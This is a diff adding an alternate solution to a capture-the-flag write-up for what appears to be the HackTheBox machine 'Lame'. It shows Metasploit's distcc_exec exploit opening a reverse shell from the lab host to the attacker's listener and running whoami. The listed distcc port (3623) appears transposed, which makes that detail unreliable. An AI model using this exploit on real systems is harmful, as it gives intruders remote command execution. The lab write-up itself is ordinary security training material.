@@ -234,3 +234,32 @@ lame
 Found user flag in `/home/makis/user.txt`
 
 Root flag in `/root/root.txt`
+
+
+## Alternate User Solution
+
+An exploit for the distcc daemon on 3623 exists as well, though it only escalates to user-space access:
+
+```shell
+msf5 exploit(unix/misc/distcc_exec) > run
+
+[*] Started reverse TCP double handler on 10.10.14.53:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo zIkIAGTz3HJcelph;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "zIkIAGTz3HJcelph\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.53:4444 -> 10.10.10.3:44183) at 2020-05-04 22:41:06 -0400
+
+whoami
+daemon
+hostname
+lame
+```
+
+No root access with this exploit.
